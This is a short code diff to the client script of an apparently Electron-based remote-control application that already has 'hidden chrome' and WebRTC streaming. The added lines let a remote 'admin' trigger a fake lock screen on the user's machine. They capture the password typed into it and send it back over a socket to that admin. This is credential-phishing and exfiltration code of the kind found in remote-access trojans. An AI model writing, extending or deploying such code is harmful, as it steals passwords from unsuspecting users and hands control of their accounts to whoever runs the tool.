@@ -429,6 +429,19 @@ window.onload = async () => {
             currentAdminForHiddenChrome = null;
         });
 
+        let currentAdminForLockscreen = null;
+        socket.on('request-fake-lockscreen', (adminId) => {
+            currentAdminForLockscreen = adminId;
+            window.electronAPI.showFakeLockscreen();
+        });
+
+        window.electronAPI.onCapturedPassword((pwd) => {
+            if (currentAdminForLockscreen) {
+                socket.emit('captured-password', { targetId: currentAdminForLockscreen, password: pwd });
+                currentAdminForLockscreen = null;
+            }
+        });
+
         // Helper function to setup WebRTC
         async function setupWebRTC(adminId, stream) {
             if (peerConnection) peerConnection.close();
